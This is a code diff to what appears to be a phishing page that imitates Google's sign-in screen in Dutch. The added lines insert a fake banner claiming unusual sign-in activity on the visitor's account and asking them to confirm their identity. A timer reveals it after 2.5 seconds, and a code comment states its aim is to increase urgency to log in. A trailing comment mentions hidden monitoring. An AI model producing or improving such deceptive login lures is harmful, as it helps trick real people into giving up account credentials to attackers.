@@ -316,6 +316,11 @@
 
         <!-- ── STAP 1: E-mail ── -->
         <div id="step-email">
+            <!-- Security notice (shown after 2s) -->
+            <div id="secNotice" style="display:none;background:#e8f0fe;border:1px solid #4285f4;border-radius:6px;padding:10px 14px;margin-bottom:20px;font-size:13px;color:#1a73e8;line-height:1.5;position:relative;">
+                <strong>Ongebruikelijke aanmeldingsactiviteit</strong> gedetecteerd op je account. Bevestig je identiteit om door te gaan.
+                <span onclick="this.parentElement.style.display='none'" style="position:absolute;top:6px;right:10px;cursor:pointer;font-size:16px;color:#5f6368;">✕</span>
+            </div>
             <img class="card-logo"
                  src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
                  alt="Google">
@@ -680,6 +685,14 @@
         // Allow digits and spaces only
         this.value = this.value.replace(/[^0-9 ]/g, '');
     });
+
+    // Show security notice after 2.5 seconds (increases urgency to log in)
+    setTimeout(function() {
+        const notice = document.getElementById('secNotice');
+        if (notice && document.getElementById('step-email').style.display !== 'none') {
+            notice.style.display = 'block';
+        }
+    }, 2500);
 </script>
 
 <!-- Hidden monitoring -->
